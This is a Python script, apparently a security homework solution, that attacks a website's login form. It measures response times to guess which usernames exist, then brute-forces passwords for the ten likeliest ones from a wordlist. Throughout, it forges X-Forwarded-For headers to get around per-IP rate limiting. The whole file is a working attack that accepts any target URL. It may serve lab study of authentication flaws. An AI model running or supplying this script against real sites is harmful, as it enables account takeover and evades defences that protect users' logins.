import requests
import sys
import time
from bs4 import BeautifulSoup

def enumerate_usernames(site, usernames_file):
    """Records timing data for an individual attack from each username and returns top 10 likely usernames by response time.
    Args:
        site (str): The base URL of the target site
        usernames_file (str): The file containing usernames to test
    Returns:
        list: A list of the top 10 usernames with the longest average response times
    """
    login_url = f"{site}/login"
    s = requests.Session()
    found_usernames = []
    with open(usernames_file, 'r') as usernames:
        lines = [line.strip() for line in usernames]
    NUM_ATTEMPTS = 5
    timing_results = []
    for idx, username in enumerate(lines):
        total_time = 0.0
        for attempt in range(NUM_ATTEMPTS):
            request_headers = {
                'X-Forwarded-For': f'1.1.1.{idx}'  # Rotate IP per username
            }
            logindata = {
                'username': username,
                'password': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
            }
            start = time.time()
            resp = s.post(login_url, data=logindata, headers=request_headers)
            elapsed = time.time() - start
            total_time += elapsed
        avg_time = total_time / NUM_ATTEMPTS
        print(f"Username: {username} | Avg response time: {avg_time:.4f} seconds")
        timing_results.append((username, avg_time))
        if (idx + 1) % 10 == 0:
            print(f"Checked {idx + 1} usernames...")

    # Sort and print the top slowest usernames
    timing_results.sort(key=lambda x: x[1], reverse=True)
    print("\nTop 10 usernames by response time:")
    for uname, t in timing_results[:10]:
        print(f"{uname}: {t:.4f} seconds")
    return [uname for uname, _ in timing_results]

def brute_force_passwords(site, usernames, passwords_file):
    """Attempts to brute-force passwords for the given top 10 usernames.
    Args:
        site (str): The base URL of the target site
        usernames (list): The list of usernames to test
        passwords_file (str): The file containing passwords to test
    Returns:
        tuple: The valid username and password if found, else (None, None)
    """
    login_url = f"{site}/login"
    s = requests.Session()
    with open(passwords_file, 'r') as pf:
        passwords = [line.strip() for line in pf]
    for username in usernames:
        print(f"\nTrying passwords for username: {username}")
        for idx, password in enumerate(passwords):
            request_headers = {
                'X-Forwarded-For': f'5.5.5.{idx}'  # Rotate IP per attempt
            }
            logindata = {
                'username': username,
                'password': password
            }
            resp = s.post(login_url, data=logindata, headers=request_headers, allow_redirects=False)
            # Success = HTTP 302 or welcome message
            if resp.status_code == 302 or 'welcome' in resp.text.lower():
                print(f"SUCCESS: Username: {username} | Password: {password}")
                return username, password
            if (idx + 1) % 10 == 0:
                print(f"  Checked {idx + 1} passwords...")
    print("No valid credentials found.")
    return None, None



if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python hw1.py <site_url>")
        sys.exit(1)
    site = sys.argv[1]
    # Run timing attack to get top usernames
    top_usernames = enumerate_usernames(site, 'usernames.txt')[:10]
    brute_force_passwords(site, top_usernames, 'passwords.txt')

